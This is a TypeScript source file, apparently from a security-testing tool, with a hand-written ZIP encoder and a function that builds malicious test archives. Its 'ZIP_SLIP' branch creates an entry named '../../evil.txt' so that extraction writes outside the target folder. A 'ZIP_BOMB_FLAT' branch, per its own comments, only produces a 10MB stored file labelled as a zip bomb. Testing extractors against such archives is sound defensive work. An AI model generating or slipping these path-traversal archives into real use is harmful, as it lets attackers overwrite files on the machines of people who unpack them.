import { GenerationSettings } from '../types';

// CRC32 Table and function
const makeCRCTable = () => {
  let c;
  const crcTable = [];
  for (let n = 0; n < 256; n++) {
    c = n;
    for (let k = 0; k < 8; k++) {
      c = ((c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1));
    }
    crcTable[n] = c;
  }
  return crcTable;
};
const crcTable = makeCRCTable();

const crc32 = (buf: Uint8Array): number => {
  let crc = 0 ^ (-1);
  for (let i = 0; i < buf.length; i++) {
    crc = (crc >>> 8) ^ crcTable[(crc ^ buf[i]) & 0xFF];
  }
  return (crc ^ (-1)) >>> 0;
};

// Simple manual Zip writer to allow "Illegal" filenames like "../../"
const createManualZip = (filename: string, content: Uint8Array): Blob => {
  const filenameBytes = new TextEncoder().encode(filename);
  const contentCrc = crc32(content);
  const contentLen = content.byteLength;
  
  // Local File Header (30 bytes + filename)
  const lfhSize = 30 + filenameBytes.length + contentLen;
  
  // Central Directory File Header (46 bytes + filename)
  const cdfhSize = 46 + filenameBytes.length;
  
  // End of Central Directory Record (22 bytes)
  const eocdSize = 22;

  const totalSize = lfhSize + cdfhSize + eocdSize;
  const buffer = new Uint8Array(totalSize);
  const view = new DataView(buffer.buffer);
  
  let offset = 0;

  // --- 1. Local File Header ---
  view.setUint32(offset, 0x04034b50, true); // Signature
  view.setUint16(offset + 4, 0x000A, true); // Version
  view.setUint16(offset + 6, 0x0000, true); // Flags
  view.setUint16(offset + 8, 0x0000, true); // Compression (Store)
  view.setUint16(offset + 10, 0x0000, true); // Time
  view.setUint16(offset + 12, 0x0000, true); // Date
  view.setUint32(offset + 14, contentCrc, true); // CRC32
  view.setUint32(offset + 18, contentLen, true); // Compressed Size
  view.setUint32(offset + 22, contentLen, true); // Uncompressed Size
  view.setUint16(offset + 26, filenameBytes.length, true); // Filename Length
  view.setUint16(offset + 28, 0x0000, true); // Extra Field Len
  
  buffer.set(filenameBytes, offset + 30);
  buffer.set(content, offset + 30 + filenameBytes.length);
  
  offset += 30 + filenameBytes.length + contentLen;
  const lfhOffset = 0;

  // --- 2. Central Directory Header ---
  const cdfhStart = offset;
  view.setUint32(offset, 0x02014b50, true); // Signature
  view.setUint16(offset + 4, 0x0014, true); // Version Made By
  view.setUint16(offset + 6, 0x000A, true); // Version Needed
  view.setUint16(offset + 8, 0x0000, true); // Flags
  view.setUint16(offset + 10, 0x0000, true); // Compression
  view.setUint16(offset + 12, 0x0000, true); // Time
  view.setUint16(offset + 14, 0x0000, true); // Date
  view.setUint32(offset + 16, contentCrc, true); // CRC32
  view.setUint32(offset + 20, contentLen, true); // Comp Size
  view.setUint32(offset + 24, contentLen, true); // Uncomp Size
  view.setUint16(offset + 28, filenameBytes.length, true); // Filename Len
  view.setUint16(offset + 30, 0x0000, true); // Extra Len
  view.setUint16(offset + 32, 0x0000, true); // Comment Len
  view.setUint16(offset + 34, 0x0000, true); // Disk Start
  view.setUint16(offset + 36, 0x0000, true); // Internal Attr
  view.setUint32(offset + 38, 0x00000000, true); // External Attr
  view.setUint32(offset + 42, lfhOffset, true); // Offset of LFH
  
  buffer.set(filenameBytes, offset + 46);
  offset += 46 + filenameBytes.length;

  // --- 3. End of Central Directory ---
  view.setUint32(offset, 0x06054b50, true); // Signature
  view.setUint16(offset + 4, 0x0000, true); // Disk Num
  view.setUint16(offset + 6, 0x0000, true); // Disk Start
  view.setUint16(offset + 8, 0x0001, true); // Num Records (Disk)
  view.setUint16(offset + 10, 0x0001, true); // Num Records (Total)
  view.setUint32(offset + 12, offset - cdfhStart, true); // Size of CD
  view.setUint32(offset + 16, cdfhStart, true); // Offset of CD
  view.setUint16(offset + 20, 0x0000, true); // Comment Len

  return new Blob([buffer], { type: 'application/zip' });
};

export const generateArchive = async (settings: GenerationSettings): Promise<Blob> => {
  const { archiveType, text } = settings;

  if (archiveType === 'ZIP_SLIP') {
    // Malicious filename escaping the extraction directory
    const maliciousFilename = "../../evil.txt";
    const content = new TextEncoder().encode(text || "You have been ZipSlipped!");
    return createManualZip(maliciousFilename, content);
  }

  if (archiveType === 'ZIP_BOMB_FLAT') {
    // Generate a file that is "large" but compressible. 
    // Since we are using STORE (no compression) in the simple manual zip above to avoid external libs, 
    // we will simulate the behavior of a heavy file by just making it moderately large (e.g. 10MB of '0')
    // A true zip bomb requires Deflate, which is complex to implement bit-perfect without libs.
    // However, we can use the browser's CompressionStream if available, but fitting that into the Zip structure is tricky manually.
    // For this POC, we will create a 10MB text file inside a zip.
    
    const size = 10 * 1024 * 1024; // 10MB
    const content = new Uint8Array(size).fill(0x41); // 'A'
    return createManualZip("heavy_file.txt", content);
  }

  return new Blob([], { type: 'application/zip' });
};
